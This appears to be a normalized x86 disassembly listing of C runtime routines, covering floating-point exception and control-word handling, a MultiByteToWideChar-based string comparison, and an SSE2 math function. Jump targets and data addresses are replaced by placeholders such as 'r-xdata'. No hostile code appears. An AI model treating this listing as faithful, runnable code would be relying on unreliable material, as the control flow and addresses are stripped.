mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
mov eax ebx
and eax [ ebp + 0x10 ]
test al 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
push 0x4
call sub_445b9b
pop ecx
and esi 0xfffffffb
jmp r-xdata
push 0x1
call sub_445b9b
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_445b9b
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_445b9b
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4485a0
mov eax [ ebp - 0x4 ]
add esp 0xc
add eax 0xfffffa00
mov [ ebp - 0x4 ] eax
fst [ ebp - 0x10 ]
fldz
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_445b9b
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0xa ]
mov ecx 0xfffffc03
and eax 0xf
or eax 0x10
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x4 ]
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x10 ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0x10 ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0xc ] 0x1
sub ecx 0x1
jne r-xdata
or eax 0x80000000
mov [ ebp - 0x10 ] eax
inc edi
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_447444
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447467
add esp 0x1c
pop ebp
retn
sub_447467
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
xor ebx ebx
inc ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi 0xc000000d
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_445bf6
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_445b5c
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
mov edx 0xfffff3ff
and eax 0x3
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
sub eax 0x1
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
sub eax 0x1
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
sub eax 0x1
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_447758
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_447467
add esp 0x1c
pop ebp
retn
sub_44777b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_42fef5
mov [ eax ] 0x22
pop ebp
retn
sub_4477aa
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub esp 0x20
xor ecx ecx
mov eax ecx
mov ecx [ eax * 8 + rw-data ]
inc eax
cmp eax 0x1d
jl r-xdata
push 0xffff
push [ ebp + 0x28 ]
call sub_445b6f
push [ ebp + 0x8 ]
call sub_44777b
fld [ ebp + 0x20 ]
add esp 0xc
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_445b6f
lea eax [ ebp - 0x20 ]
push eax
call sub_429ceb
add esp 0xc
test eax eax
jne r-xdata
cmp [ eax * 8 + rw-data ] edx
je r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
pop esi
jmp r-xdata
push esi
call sub_44777b
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
sub_44784c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_434d0d
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push eax
push [ ebp + 0x18 ]
call sub_434d0d
pop ecx
pop ecx
sub esi eax
jne r-xdata
test eax eax
je r-xdata
xor eax eax
test esi esi
setns al
lea eax [ eax * 2 + 0x1 ]
push 0x2
pop eax
jmp r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4306d2
jmp r-xdata
pop esi
pop ebp
retn
sub_4478b4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x24 ] eax
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x20 ] edi
test esi esi
jle r-xdata
cmp esi 0xffffffff
jge r-xdata
push esi
push edi
call sub_446d01
pop ecx
mov esi eax
mov eax [ ebp - 0x24 ]
pop ecx
mov ebx [ ebp + 0x20 ]
test ebx ebx
jle r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0xffffffff
jl r-xdata
push ebx
push eax
call sub_446d01
pop ecx
pop ecx
mov ebx eax
jmp r-xdata
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x24 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x28 ]
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov [ ebp + 0x24 ] eax
cmp esi ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp ebx 0x1
jle r-xdata
push 0x2
xor edi edi
push edi
push edi
push esi
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
cmp esi 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
mov eax edi
mov [ ebp - 0x1c ] edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
test esi esi
jle r-xdata
pop eax
jmp r-xdata
mov ebx [ ebp - 0x1c ]
push [ ebp - 0x28 ]
push eax
push esi
push [ ebp - 0x20 ]
mov esi [ ebp + 0x24 ]
push 0x1
push esi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov [ ebp - 0x1c ] eax
pop ecx
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_449960
mov eax esp
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test ebx ebx
jle r-xdata
push 0x2
pop eax
cmp [ ebp - 0x18 ] eax
jb r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push 0x9
push esi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push 0x2
pop eax
cmp [ ebp - 0x18 ] eax
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea ecx [ ebp - 0x12 ]
je r-xdata
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
test eax eax
je r-xdata
add eax 0x8
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea ecx [ ebp - 0x12 ]
je r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
mov esi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov bl [ edi ]
cmp bl [ ecx ]
jb r-xdata
mov ebx [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push esi
push ebx
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d0e4
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_449960
mov esi esp
test esi esi
je r-xdata
mov bl [ esi ]
cmp bl [ ecx ]
jb r-xdata
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
cmp bl dl
jbe r-xdata
push ebx
call sub_43aeb9
pop ecx
mov eax edi
mov ebx [ ebp - 0x1c ]
push edi
push edi
push edi
push [ ebp - 0x20 ]
push esi
push [ ebp - 0x28 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp - 0x2c ]
call sub_4306d2
mov edi eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
add ecx eax
cmp [ ecx ] 0x0
jne r-xdata
cmp bl dl
jbe r-xdata
jmp r-xdata
push esi
call sub_43aeb9
pop ecx
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
jmp r-xdata
sub_447b5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
push [ ebp + 0x24 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4478b4
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_447ba4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jle r-xdata
xor eax eax
push eax
push eax
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_430d5f
pop esi
pop ebp
retn
push esi
push [ ebp + 0x10 ]
call sub_434d0d
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
mov esi eax
sub_447be2
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x7e80
je r-xdata
mov eax ecx
pop ebp
retn
test dl dl
jns r-xdata
push edi
mov edi 0x200
test edi edx
je r-xdata
push 0x10
pop ecx
test edx 0x400
je r-xdata
or ecx 0x8
test edx 0x800
je r-xdata
or ecx 0x4
test edx 0x1000
je r-xdata
or ecx 0x2
push esi
mov esi 0x6000
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x4000
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x2000
je r-xdata
or ecx 0x100
jmp r-xdata
pop edi
or ecx edi
sub_447c5f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0xc3d
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x1
je r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ecx
test dl 0x8
je r-xdata
or ecx 0x8
test dl 0x10
je r-xdata
or ecx 0x4
test dl 0x20
je r-xdata
or ecx 0x2
push esi
mov esi 0xc00
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1
test edx 0x800
je r-xdata
or ecx 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or ecx 0x100
jmp r-xdata
or ecx 0x200
sub_447cd2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3d
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
or eax 0x1
sub_447d0b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x3d
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
or eax 0x1
sub_447d44
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
test dl 0x8
je r-xdata
inc ecx
test dl 0x4
je r-xdata
or ecx 0x4
test dl 0x2
je r-xdata
or ecx 0x8
test dl 0x1
je r-xdata
or ecx 0x10
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x20
test edx 0x200
je r-xdata
or ecx 0xc00
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x400
jmp r-xdata
or ecx 0x800
sub_447db5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
test edx 0x31f
je r-xdata
mov eax ecx
pop ebp
retn
test dl 0x10
je r-xdata
push edi
mov edi 0x200
test dl 0x8
je r-xdata
mov ecx 0x80
test dl 0x4
je r-xdata
or ecx edi
test dl 0x2
je r-xdata
or ecx 0x400
test dl 0x1
je r-xdata
or ecx 0x800
push esi
mov esi 0x300
mov eax edx
and eax esi
cmp eax esi
pop esi
jne r-xdata
or ecx 0x1000
test edi edx
je r-xdata
or ecx 0x6000
jmp r-xdata
test edx 0x100
je r-xdata
or ecx 0x2000
jmp r-xdata
pop edi
or ecx 0x4000
sub_447e35
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1f
je r-xdata
pop ebp
retn
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
or eax 0x20
sub_447e6c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1f
je r-xdata
pop ebp
retn
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
or eax 0x20
sub_447ea3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
and [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
fnstcw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ebp - 0x4 ]
push esi
push eax
call sub_447c5f
push [ ebp - 0x8 ]
mov esi eax
call sub_447be2
pop ecx
or eax esi
pop ecx
and eax 0x31f
pop esi
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
sub_447ee6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
xor eax eax
and [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ax
fnstsw [ ebp - 0x4 ]
cmp [ rw-data ] 0x1
jl r-xdata
movzx eax [ ebp - 0x4 ]
push esi
push eax
call sub_447d0b
push [ ebp - 0x8 ]
mov esi eax
call sub_447cd2
pop ecx
or eax esi
pop ecx
and eax 0x1f
pop esi
mov esp ebp
pop ebp
retn
stmxcsr [ ebp - 0x8 ]
sub_447f27
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
mov ebx 0x31f
push ebx
call sub_447d44
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x20 ]
call sub_447d44
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x20 ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push ebx
call sub_447db5
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_447db5
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_447fa7
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push esi
push edi
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
fnstenv [ ebp - 0x20 ]
push 0x1f
call sub_447e35
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x1c ]
call sub_447e35
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x1c ] esi
fldenv [ ebp - 0x20 ]
cmp [ rw-data ] 0x1
jl r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] edi
stmxcsr [ ebp - 0x4 ]
push 0x1f
call sub_447e6c
push [ ebp + 0x8 ]
mov esi eax
not esi
and esi [ ebp - 0x4 ]
call sub_447e6c
pop ecx
or esi eax
pop ecx
mov [ ebp - 0x4 ] esi
ldmxcsr [ ebp - 0x4 ]
sub_44804e
mov edx 0x0
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
cmpsd xmm1 xmm0 0x0
pextrw eax xmm1 0x0
cmp eax 0x0
ja r-xdata
sub ecx 0x3fe
add ecx edx
cvtsi2sd xmm6 ecx
unpcklpd xmm6 xmm6
shl ecx 0xa
add eax ecx
mov ecx 0x10
mov edx 0x0
cmp eax 0x0
cmove edx ecx
movapd xmm1 [ r--data ]
movapd xmm3 xmm0
movapd xmm2 [ r--data ]
mulpd xmm1 xmm0
mulpd xmm3 xmm3
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm3
movapd xmm5 [ r--data ]
mulpd xmm6 xmm5
movapd xmm5 [ edx + r--data ]
andpd xmm4 xmm5
addpd xmm7 xmm6
addpd xmm7 xmm4
mulpd xmm1 xmm0
mulsd xmm3 xmm0
addpd xmm1 xmm2
movapd xmm2 [ r--data ]
mulpd xmm2 xmm0
movapd xmm6 xmm7
unpckhpd xmm6 xmm6
mulpd xmm1 xmm3
sub esp 0x10
movapd xmm0 xmm1
addpd xmm1 xmm2
unpckhpd xmm0 xmm0
addsd xmm0 xmm1
addsd xmm0 xmm6
addsd xmm0 xmm7
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm2 [ r--data ]
divsd xmm2 xmm0
movlpd xmm1 [ r--data ]
mov edx 0x8
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm1
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x10
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_4362b2
fld [ esp + 0x10 ]
add esp 0x1c
retn
movlpd xmm1 [ r--data ]
mulsd xmm0 xmm1
mov edx 0xffffffcc
jmp r-xdata
cmp ecx 0x7fe
ja r-xdata
movapd xmm5 xmm0
unpcklpd xmm0 xmm0
psrlq xmm5 0x34
pextrw ecx xmm5 0x0
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
movapd xmm3 [ r--data ]
movapd xmm4 [ r--data ]
movapd xmm6 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm3
addpd xmm4 xmm0
pextrw eax xmm4 0x0
and eax 0x7f0
movapd xmm4 [ eax + r--data ]
movapd xmm7 [ eax + r--data ]
andpd xmm6 xmm0
subpd xmm0 xmm6
mulpd xmm6 xmm4
subpd xmm6 xmm2
addsd xmm7 xmm6
mulpd xmm0 xmm4
movapd xmm4 xmm0
addpd xmm0 xmm6
and ecx 0xfff
sub ecx 0x1
cmp ecx 0x7fd
ja r-xdata
add ecx 0x1
and ecx 0x7ff
cmp ecx 0x7ff
jae r-xdata
movlpd xmm0 [ esp + 0x4 ]
movapd xmm1 [ r--data ]
movapd xmm2 [ r--data ]
andpd xmm0 xmm1
orpd xmm0 xmm2
cmpsd xmm2 xmm0 0x0
pextrw eax xmm2 0x0
cmp eax 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movlpd xmm0 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd ecx xmm2
and ecx 0xfffff
or eax ecx
cmp eax 0x0
je r-xdata
xorpd xmm1 xmm1
